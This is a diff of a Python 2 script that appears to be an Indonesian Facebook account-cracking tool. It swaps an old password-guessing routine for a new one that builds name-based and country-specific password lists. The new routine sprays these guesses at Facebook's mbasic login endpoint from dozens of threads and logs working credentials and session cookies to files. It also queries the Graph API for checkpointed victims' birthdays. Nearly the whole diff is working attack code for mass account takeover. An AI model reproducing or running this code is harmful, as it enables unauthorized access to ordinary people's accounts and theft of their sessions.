@@ -1,12 +1,12 @@
 #-*-coding:utf-8-*-
-import os,re,sys,itertools,time,requests,random,threading,json,random,datetime,bs4
+import requests,bs4,sys,os,subprocess,time,datetime
+import requests,sys,random,re,base64,json
 from multiprocessing.pool import ThreadPool
 from requests.exceptions import ConnectionError
 from bs4 import BeautifulSoup as parser
 from urllib2 import urlopen
-from cek_opsi import cek_opsi
 reload(sys)
-sys.setdefaultencoding('utf8')
+sys.setdefaultencoding("utf-8")
 """   Terimaksih Untuk Semuanya   """
 #####################################
 
@@ -18,8 +18,8 @@ Kalo Mau Tinggal Tambahin Faham?
 Dan Jika Ingin Di Ganti Izin Dulu :v
 
  				  """
-				  
-				  
+
+
 #####################################
 logo = ("""\x1b[1;92m ___ ___ ___ __  __ ___ _   _ __  __
 \x1b[1;92m| _ \ _ \ __|  \/  |_ _| | | |  \/  |
@@ -31,12 +31,9 @@ logo = ("""\x1b[1;92m ___ ___ ___ __  __ ___ _   _ __  __
 \x1b[1;95m[\x1b[1;97m•\x1b[1;95m]\x1b[1;97m gh : github.com/rozhakxd
 \x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m——————————————————————————————
 """)
-ok = []
-cp = []
 live = []
 chek = []
 die = []
-loop = 0
 stop = False
 link =("https://gramho.com")
 hostm=("https://m.facebook.com")
@@ -46,6 +43,12 @@ data=json.load(response)
 ip=data['ip']
 org=data['org']
 region=data['region']
+country=requests.get("https://ipapi.com/ip_api.php?ip="+ip,headers={"Referer":"https://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36"}).json()["country_name"]
+ua=random.choice(["Mozilla/5.0 (Linux; Android 5.0; Lenovo A1000 Build/S100; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36",
+"NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
+"NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)",
+"Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G977N/KSU4CTG1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36"])
+mbasic_h={"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
 useragent=random.choice(["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
@@ -708,7 +711,7 @@ def daftar_menu():
 	elif pilih == "8":
 		teman()
 	elif pilih == "9":
-		mbasic()
+		crack()
 	elif pilih == "10":
 		cek_opsi()
 	elif pilih == "11":
@@ -750,99 +753,6 @@ def daftar_menu():
 			exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Ada")
 	else:
 		exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
-def mbasic():
-	file = raw_input("\n\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;96m ")
-	if file == "":
-		exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Ada")
-	try:
-		id=open(file, "r").readlines()
-	except IOError:
-		exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Ada")
-	print ("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Total ID :\x1b[1;96m "+str(len(id)))
-	print ("\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m Mainkan Mode Pesawat Jika Tidak Ada Hasil\n")
-	def main(arg):
-		global loop, ok, cp
-		sys.stdout.write(
-                        "\r\x1b[1;97m[Crack] %s/%s Ok:%s - Cp:%s "%(loop, len(id), len(ok), len(cp))
-                ); sys.stdout.flush()
-		user = arg
-		uid,name=user.split("<=>")
-		xx = name.split(' ')
-                if len(xx) == 3 or len(xx) == 4 or len(xx) == 5 or len(xx) == 6:
-                        pwx = [name, xx[0]+"123", xx[0]+"1234", xx[0]+"12345", xx[0]+"123456"]
-                else:
-                        pwx = [name, xx[0]+"123", xx[0]+"1234", xx[0]+"12345", xx[0]+"123456"]
-		try:
-			for pw in pwx:
-				url = 'https://mbasic.facebook.com/login.php'
-				headersc = {
-				'User-Agent' : 'Mozilla/5.0 (Linux; Android 5.0; Lenovo A7600-H Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/E7FBAF',
-				'Accept-Language' : 'en-US,en;q=0.5'
-				}
-				data = {'email': uid,'pass': pw}
-				xox = requests.post(url, headers=headersc, data=data).text
-				if 'mbasic_logout_button' in xox or 'save-device' in xox:
-					ok.append(uid+"|"+pw)
-					open("Live.txt","a").write("%s|%s\n"%(uid, pw))
-					print("\r\x1b[1;92m[Live] "+uid+"|"+pw+"             ")
-					break
-					continue
-					continue
-				elif "checkpoint" in xox:
-					try:
-						token = open('___rozhak___','r').read()
-                                                q = requests.get("https://graph.facebook.com/"+uid+"?access_token="+token)
-                                                qw = json.loads(q.text)
-                                                ttl = qw["birthday"]
-						ups = qw["updated_time"][:10]
-                                                month, day, year = ttl.split("/")
-                                                birthday = day+'/'+month+'/'+year
-						year, month, day = ups.split("-")
-						update = day+"/"+month+"/"+year
-                                        except (KeyError, IOError):
-                                         birthday = '- '
-					 update = '- '
-                                        except:pass
-					try:
-                                                uds = []
-                                                token = open('___rozhak___','r').read()
-                                                f = requests.get("https://graph.facebook.com/"+uid+"/friends?limit=100000&access_token="+token)
-                                                z = json.loads(f.text)
-                                                for i in z["data"]:
-                                                        uds.append(i['id'])
-                                                friend = str(len(uds))
-                                        except (KeyError, IOError):
-                                         friend = '- '
-					except:pass
-					try:
-                                                udq = []
-                                                token = open('___rozhak___','r').read()
-                                                k = requests.get("https://graph.facebook.com/"+uid+"/subscribers?limit=100000&access_token="+token)
-                                                z = json.loads(k.text)
-                                                for i in z["data"]:
-                                                        udq.append(i['id'])
-                                                follower = str(len(udq))
-                                        except (KeyError, IOError):
-                                         follower = '- '
-					except:pass
-					cp.append(uid+"|"+pw)
-					open("Check.txt","a").write("%s|%s\n"%(uid, pw))
-					print("\r\x1b[1;93m[Check] "+uid+"|"+pw+"            ")
-					print("\x1b[1;93m[1] Teman : "+friend)
-					print("\x1b[1;93m[2] Pengikut : "+follower)
-					print("\x1b[1;93m[3] Diperbarui : "+update)
-					print("\x1b[1;93m[4] Tanggal Lahir : "+birthday)
-					break
-					continue
-					continue
-			loop += 1
-		except:
-			pass
-	p = ThreadPool(30)
-    	p.map(main, id)
-	os.remove(file)
-	exit("\n\x1b[1;97m[\x1b[1;92mSelesai\x1b[1;97m]")
-
 def menu_instagram():
 	global ip, region
 	try:
@@ -1058,6 +968,162 @@ def query_v2():
                         crack(y,pw)
         except Exception as e:
 		print("\n\x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m Dump Limit Crack Selesai...")
+def generate(text):
+	global country
+	results=[]
+	for i in text.split(" "):
+		if len(i)<3:
+			continue
+		else:
+			i=i.lower()
+			if len(i)==1 or len(i)==2 or len(i)==3 or len(i)==4 or len(i)==5:
+				results.append(i+"123")
+				results.append(i+"12345")
+			else:
+				results.append(text)
+				results.append(i+"123")
+				results.append(i+"1234")
+				results.append(i+"12345")
+				if "Indonesia" in country:
+					results.append("bismillah")
+                                        results.append("sayang")
+				if "Pakistan" in country:
+					results.append("pakistan")
+					results.append("786786")
+				if "Bangladesh" in country:
+					results.append("bangladesh")
+					results.append("102030")
+	return results
+def mbasic(em,pas,hosts):
+	global ua,mbasic_h
+	r=requests.Session()
+	r.headers.update(mbasic_h)
+	p=r.get("https://mbasic.facebook.com/")
+	b=bs4.BeautifulSoup(p.text,"html.parser")
+	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
+	data={}
+	for i in b("input"):
+		if i.get("value") is None:
+			if i.get("name")=="email":
+				data.update({"email":em})
+			elif i.get("name")=="pass":
+				data.update({"pass":pas})
+			else:
+				data.update({i.get("name"):""})
+		else:
+			data.update({i.get("name"):i.get("value")})
+	data.update(
+		{"fb_dtsg":meta,"m_sess":"","__user":"0",
+		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
+		}
+	)
+	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
+	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
+	if "c_user" in r.cookies.get_dict().keys():
+		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
+	elif "checkpoint" in r.cookies.get_dict().keys():
+		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
+	else:return {"status":"error","email":em,"pass":pas}
+class crack:
+	def __init__(self):
+		self.ada=[]
+		self.cp=[]
+		self.ko=0
+		while True:
+			f=raw_input("\n\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Gunakan Password Manual (y/t) :\x1b[1;92m ")
+			if f=="":continue
+			elif f=="y":
+				try:
+					while True:
+						try:
+							self.apk=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;92m ")
+							self.fs=open(self.apk).read().splitlines()
+							break
+						except Exception as e:
+							exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Ada")
+							continue
+					self.fl=[]
+					for i in self.fs:
+						try:
+							self.fl.append({"id":i.split("<=>")[0]})
+						except:continue
+				except Exception as e:
+					exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Valid")
+					continue
+				print("\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m Contoh Password :\x1b[1;92m Sayang,Bangsat,123456")
+				self.pwlist()
+				break
+			elif f=="t":
+				try:
+					while True:
+						try:
+							self.apk=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;92m ")
+							self.fs=open(self.apk).read().splitlines()
+							break
+						except Exception as e:
+							exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Ada")
+							continue
+					self.fl=[]
+					for i in self.fs:
+						try:
+							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
+						except:continue
+				except Exception as e:
+					exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Valid")
+					continue
+				print("\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m Mainkan Mode Pesawat Jika Tidak Ada Hasil\n")
+				ThreadPool(35).map(self.main,self.fl)
+				os.remove(self.apk)
+				exit("\n\x1b[1;97m[\x1b[1;92mSelesai\x1b[1;97m]")
+				break
+	def pwlist(self):
+		self.pw=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Password :\x1b[1;92m ").split(",")
+		if len(self.pw) ==0:
+			self.pwlist()
+		else:
+			for i in self.fl:
+				i.update({"pw":self.pw})
+			print("\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m Mainkan Mode Pesawat Jika Tidak Ada Hasil\n")
+			ThreadPool(30).map(self.main,self.fl)
+			os.remove(self.apk)
+			exit("\n\x1b[1;97m[\x1b[1;92mSelesai\x1b[1;97m]")
+	def main(self,fl):
+		try:
+			for i in fl.get("pw"):
+				log=mbasic(fl.get("id"),
+					i,"https://mbasic.facebook.com")
+				if log.get("status")=="success":
+					print("\r\x1b[1;92m[Ok] "+(fl.get("id")+"|"+i+" "+gets_cookies(log.get("cookies"))))
+					self.ada.append("%s | %s"%(fl.get("id"),i))
+					if fl.get("id") in open("Live.txt").read():
+						break
+					else:
+						open("Live.txt","a+").write(
+						"%s|%s %s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
+					ko="%s|%s %s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
+					break
+				elif log.get("status")=="cp":
+					try:
+						token=open('___rozhak___','r').read()
+						q=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+token)
+						w=json.loads(q.text)
+						bt=w["birthday"]
+
+					except (KeyError, IOError):
+		                         bt = "         "
+					except:pass
+					print("\r\x1b[1;93m[Cp] "+(fl.get("id")+"|"+i+" "+bt+" "))
+					self.cp.append("%s|%s %s"%(fl.get("id"),i,bt))
+					open("Check.txt","a+").write(
+						"%s|%s %s\n"%(fl.get("id"),i,bt))
+					break
+				else:continue
+
+			self.ko+=1
+			print "\r\x1b[1;97m[Crack] %s/%s Ok:%s - Cp:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
+		except:
+			self.main(fl)
 
 if __name__=='__main__':
+	os.system('git pull')
 	cek_cookie()
